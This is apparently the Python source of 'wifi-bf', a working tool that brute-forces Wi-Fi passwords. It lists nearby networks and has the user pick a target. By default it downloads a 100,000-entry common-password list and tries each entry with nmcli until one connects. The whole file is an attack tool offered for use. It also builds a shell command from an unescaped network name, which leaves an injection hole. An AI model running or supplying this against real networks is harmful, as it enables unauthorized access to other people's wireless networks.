import argparse
import subprocess
import os
import urllib.request
import sys
import time
from ssid import start

TEMP_PASSWORDS_FILE = "/tmp/wifi-bf-passwords.txt"
DEFAULT_PASSWORDS_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"

def cls():
    """
    This function clears the screen
    """
    os.system("cls" if os.name == "nt" else "clear")


def header():
    """
    This function prints the header of the program
    """
    print(
        """
==============================================================
	██╗    ██╗██╗███████╗██╗      ██████╗ ███████╗
	██║    ██║██║██╔════╝██║      ██╔══██╗██╔════╝
	██║ █╗ ██║██║█████╗  ██║█████╗██████╔╝█████╗  
	██║███╗██║██║██╔══╝  ██║╚════╝██╔══██╗██╔══╝  
	╚███╔███╔╝██║██║     ██║      ██████╔╝██║     
	 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═╝     
                                     
                 https://github.com/flancast90
                         By: BLUND3R
                 https://github.com/pablolucas890
                         By: P89L0
==============================================================
    
    """
    )


class Bcolors:
    """
    This class contains the color codes for the program
    """

    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    VERBOSEGRAY = "\033[170m"


def argument_parser():
    """
    This function cutlize the argparse which gives a description of the program and
    the list of arguments supported
    """
    parser = argparse.ArgumentParser(
        prog="wifi-bf", description="Brute force wifi password with python 3"
    )

    parser.add_argument(
        "-u",
        "--url",
        type=str,
        default=None,
        help="The url that contains the list of passwords",
    )
    parser.add_argument(
        "-f",
        "--file",
        type=str,
        default=None,
        help="The file that contains the list of passwords",
    )

    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Optional: Use to show all passwords attempted, rather than just the successful one.",
    )

    return parser.parse_args()


def fetch_password_from_url(url):
    """
    This function returns a list of passwords from a url
    """
    try:
        return urllib.request.urlopen(url)
    except Exception as e:
        print(f"Error fetching passwords from url: {e}")
        return None


def save_passwords_locally(passwords):
    """
    This function saves a list of passwords to a file
    """

    with open(TEMP_PASSWORDS_FILE, "w", encoding="utf-8") as file:
        for password in passwords:
            decoded_line = password.decode("utf-8")
            file.write(decoded_line)


def local_passwords_file_exists():
    """
    This function checks if a local password file is found
    """

    return os.path.exists(TEMP_PASSWORDS_FILE)


def get_local_passwords():
    """
    This function returns a local previously downloaded local passwords file
    """

    with open(TEMP_PASSWORDS_FILE, "r", encoding="utf-8") as file:
        return file.readlines()


def require_root():
    """
    This function checks whether the user is running the program as root. If the user is not a root,
    an error message is displayed and the program exit
    """

    r = os.popen("whoami").read()
    if r.strip() != "root":
        print("Run it as root.")
        sys.exit(-1)


def display_targets(networks, security_type):
    """
    This function shows the user the list of targets
    """
    print("Select a target: \n")

    _, columns = os.popen("stty size", "r").read().split()
    for i in enumerate(networks):
        width = len(str(str(i[0] + 1) + ". " + i[1] + security_type[i[0]])) + 2
        spacer = " "

        if int(columns) >= 100:
            calc = int((int(columns) - int(width)) * 0.75)
        else:
            calc = int(columns) - int(width)

        for index in range(calc):
            spacer += "."
            if index == (calc - 1):
                spacer += " "

        print(str(i[0] + 1) + ". " + i[1] + spacer + security_type[i[0]])


def prompt_for_target_choice(max_targets):
    """
    This function prompt the user to enter the target choice and returns the choice.
    The function runs in a loop until the user enter the correct target
    """
    while True:
        try:
            selected = int(input("\nEnter number of target: "))
            if selected >= 1 and selected <= max_targets:
                return selected - 1
        except Exception as e:
            print(f"Invalid choice: {e}")

        print("Invalid choice: Please pick a number between 1 and " + str(max_targets))


def brute_force(selected_network, passwords, args):
    """
    This function takes the targeted network and list of password and attempt to brute force it.
    """

    nmcli_command = f"nmcli connection delete '{selected_network}'"

    if args.verbose is False:
        nmcli_command += " > /dev/null 2>&1"

    for password in passwords:
        subprocess.run(nmcli_command, shell=True, check=False)
        # necessary due to NetworkManager restart after unsuccessful attempt at login
        password = password.strip()

        # when when obtain password from url we need the decode utf-8 however we doesnt when reading from file
        if isinstance(password, str):
            decoded_line = password
        else:
            decoded_line = password.decode("utf-8")

        if args.verbose is True:
            print(
                Bcolors.HEADER
                + "** TESTING **: with password '"
                + decoded_line
                + "'"
                + Bcolors.ENDC
            )

        if len(decoded_line) >= 8:
            contain = False

            while contain is False:
                available = os.popen("nmcli -f SSID dev wifi").read()
                available = available.split("\n")
                available = [item.strip() for item in available]

                if selected_network in available:
                    contain = True
                else:
                    time.sleep(1)

            commands = [
                "sudo",
                "nmcli",
                "dev",
                "wifi",
                "connect",
                selected_network,
                "password",
                decoded_line,
            ]

            try:
                output = subprocess.run(
                    commands, capture_output=True, text=True, check=True
                )
                if "error" in output.stdout.lower():
                    if args.verbose is True:
                        print(
                            Bcolors.FAIL
                            + "** TESTING **: password '"
                            + decoded_line
                            + "' failed."
                            + Bcolors.ENDC
                        )
                        print(f"{Bcolors.VERBOSEGRAY}{output.stdout}{Bcolors.ENDC}")
                elif "successfull" in output.stdout.lower():
                    sys.exit(
                        Bcolors.OKGREEN
                        + "** KEY FOUND! **: password '"
                        + decoded_line
                        + "' succeeded."
                        + Bcolors.ENDC
                    )
                else:
                    print(f"Unknown output: {output.stdout}")
            except subprocess.CalledProcessError:
                if args.verbose is True:
                    print(
                        Bcolors.FAIL
                        + "** TESTING **: password '"
                        + decoded_line
                        + "' failed."
                        + Bcolors.ENDC
                    )

        else:
            if args.verbose is True:
                print(
                    Bcolors.OKCYAN
                    + "** TESTING **: password '"
                    + decoded_line
                    + "' too short, passing."
                    + Bcolors.ENDC
                )

    print(Bcolors.FAIL + "** RESULTS **: All passwords failed :(" + Bcolors.ENDC)


def main():
    """
    The main function
    """
    cls()
    header()
    require_root()
    args = argument_parser()

    # The user chose to supplied their own url
    if args.url is not None:
        passwords = fetch_password_from_url(args.url)
    # user elect to read passwords form a file
    elif args.file is not None:
        file = open(args.file, "r", encoding="utf-8")
        passwords = file.readlines()
        if not passwords:
            print("Password file cannot be empty!")
            sys.exit(0)
        file.close()
    else:
        # fallback to the default list as the user didn't supply a password list
        default_url = DEFAULT_PASSWORDS_URL
        passwords = fetch_password_from_url(default_url)
        if passwords:
            save_passwords_locally(passwords=passwords)
            passwords = get_local_passwords()
        elif local_passwords_file_exists():
            passwords = get_local_passwords()
        else:
            sys.exit(
                Bcolors.FAIL + "Fetch failed. Check internet status." + Bcolors.ENDC
            )

    # grabbing the list of the network ssids
    func_call = start(1)
    networks = func_call[0]
    security_type = func_call[1]

    if not networks:
        print("No networks found!")
        sys.exit(-1)

    display_targets(networks, security_type)
    max_targets = len(networks)
    pick = prompt_for_target_choice(max_targets)
    target = networks[pick]

    cls()
    header()

    print(
        "\nWifi-bf is running. If you would like to see the tests in realtime, enable the [-v] flag at start."
    )

    brute_force(target, passwords, args)


main()
